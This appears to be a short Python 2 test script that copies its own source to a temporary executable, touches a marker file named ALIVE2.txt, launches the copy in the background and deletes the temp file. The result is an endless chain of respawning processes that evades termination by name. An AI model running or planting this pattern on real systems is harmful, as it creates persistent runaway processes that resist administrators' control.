#!/usr/bin/python

import os
import sys
import time
import shutil
import tempfile

f = open(sys.argv[0])
code = f.read()
f.close()
time.sleep(1)

tempname = tempfile.mktemp(prefix='adj')
g = open(tempname, "w")
g.write(code)
g.close()
os.chmod(tempname, 0555)
os.system("touch ALIVE2.txt")
os.system("%s &" % (tempname))

time.sleep(1)
os.remove(tempname)
